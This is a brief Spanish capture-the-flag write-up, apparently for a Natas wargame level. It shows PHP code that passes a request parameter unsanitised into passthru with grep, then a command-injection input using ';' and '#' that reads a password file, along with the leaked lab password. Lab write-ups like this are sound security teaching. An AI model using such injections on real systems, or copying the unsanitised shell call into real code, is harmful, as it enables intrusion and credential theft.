Si inspeccionamos el HTML, vemos que es similar al del nivel anterior.
Inspeccionamos el código fuente.

```php
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
?>
```

Debido a que lo que enviamos se ejecuta de forma directa en nuestro programa,
podremos armar una cadena que ejecute un comando arbitrario. Para esto,
utilizamos el simbolo `;`, que es interpretado en bash como un separador de
comandos. También podemos utilizar `#` para comentar el resto del comando.

```bash
$ grep -i ; cat /etc/natas_webpass/natas10 # dictionary.txt
D44EcsFkLxPIkAAKLosx8z3hxX1Z4MCE
```
